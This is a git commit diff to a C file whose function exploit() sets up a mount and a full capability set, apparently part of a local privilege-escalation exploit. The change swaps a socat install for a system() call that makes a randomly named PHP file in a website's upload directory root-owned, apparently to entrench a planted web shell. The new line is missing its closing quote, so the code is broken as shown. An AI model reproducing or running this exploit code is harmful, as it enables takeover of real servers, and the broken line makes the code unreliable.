1b7fa0dca11163b370cae995015480f9d6f41298
adit ganteng <kangpepes@protonmail.com>
2025-03-16 14:43:34 +0700

    Update a.c

--- a.c
+++ a.c
@@ -93,7 +93,7 @@ static int exploit() {
         err(1, "mount %s", DIR_MERGE);
 
     // Ganti system("whoami") dengan eksekusi /tmp/rooting/./y
-    system("sudo apt install socat -y");
+    system("chown root:root /var/www/html/rds/2025/public/uploads/users/1742104052_681c17d36b38f11547f6.php);
 
     // all+ep
     char cap[] = "\x01\x00\x00\x02\xff\xff\xff\xff\x00\x00\x00\x00\xff\xff\xff\xff\x00\x00\x00\x00";
